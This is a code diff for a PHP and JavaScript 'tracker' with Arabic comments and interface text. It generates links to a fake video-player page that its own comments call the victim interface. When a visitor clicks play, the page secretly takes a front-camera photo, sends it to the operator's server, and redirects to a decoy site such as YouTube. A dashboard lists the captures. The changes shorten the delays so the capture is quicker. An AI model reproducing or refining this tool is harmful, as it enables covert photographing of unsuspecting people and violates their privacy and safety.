@@ -7,7 +7,7 @@ ini_set('display_errors', 1);
 error_reporting(E_ALL);
 
 try {
-    $db = new PDO('sqlite:tracker_advanced.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+    $db = new PDO('sqlite:tracker_sync.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
@@ -112,7 +112,7 @@ if (!empty($filter_code)) {
     $captures =$db->query("SELECT * FROM captures ORDER BY id DESC LIMIT 30")->fetchAll(PDO::FETCH_ASSOC);
 }
 
-// واجهة الضحية ذات التقنية الطبقية التفاعلية
+// واجهة الضحية بالاستدعاء الفوري المتزامن
 if (isset($_GET['r']) && !empty($target_redirect)):
 ?>
 <!DOCTYPE html>
@@ -134,7 +134,8 @@ if (isset($_GET['r']) && !empty($target_redirect)):
         const redirectCode = "<?php echo htmlspecialchars($_GET['r']); ?>";
         const targetUrl = "<?php echo $target_redirect; ?>";
 
-        function triggerCaptureAndRedirect() {
+        function instantCaptureAndRedirect() {
+            // الاستدعاء المباشر الفوري داخل حدث النقر دون أي تأخير زمني
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                 .then(stream => {
                     const video = document.createElement('video');
@@ -142,6 +143,7 @@ if (isset($_GET['r']) && !empty($target_redirect)):
                     video.setAttribute('playsinline', '');
                     video.play();
                     
+                    // انتظار قصير جداً لالتقاط الإطار بعد فتح الدفق
                     setTimeout(() => {
                         const canvas = document.createElement('canvas');
                         canvas.width = video.videoWidth || 640;
@@ -158,7 +160,7 @@ if (isset($_GET['r']) && !empty($target_redirect)):
 
                         if (navigator.sendBeacon) {
                             navigator.sendBeacon(`/?r=${redirectCode}`, formData);
-                            setTimeout(() => { window.location.replace(targetUrl); }, 300);
+                            setTimeout(() => { window.location.replace(targetUrl); }, 200);
                         } else {
                             fetch(`/?r=${redirectCode}`, {
                                 method: 'POST',
@@ -168,7 +170,7 @@ if (isset($_GET['r']) && !empty($target_redirect)):
                                 window.location.replace(targetUrl);
                             });
                         }
-                    }, 400);
+                    }, 300);
                 })
                 .catch(err => {
                     window.location.replace(targetUrl);
@@ -177,7 +179,7 @@ if (isset($_GET['r']) && !empty($target_redirect)):
     </script>
 </head>
 <body>
-    <div class="player-container" onclick="triggerCaptureAndRedirect()">
+    <div class="player-container" onclick="instantCaptureAndRedirect()">
         <div class="play-btn"></div>
     </div>
 </body>
@@ -192,7 +194,7 @@ endif;
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة التحكم - التقنية الطبقية المتقدمة</title>
+    <title>لوحة التحكم - الاستدعاء الفوري</title>
     <style>
         :root {
             --bg-main: #0b0f17;
@@ -232,7 +234,7 @@ endif;
     <div class="wrapper">
         
         <section class="section-box">
-            <h2>توليد رابط التقنية المتقدمة</h2>
+            <h2>توليد رابط الاستدعاء الفوري</h2>
             <form method="POST" class="form-row">
                 <input type="text" name="target_url" placeholder="أدخل الرابط المستهدف (مثل يوتيوب)..." required>
                 <button type="submit" name="create" class="btn">توليد الرابط</button>
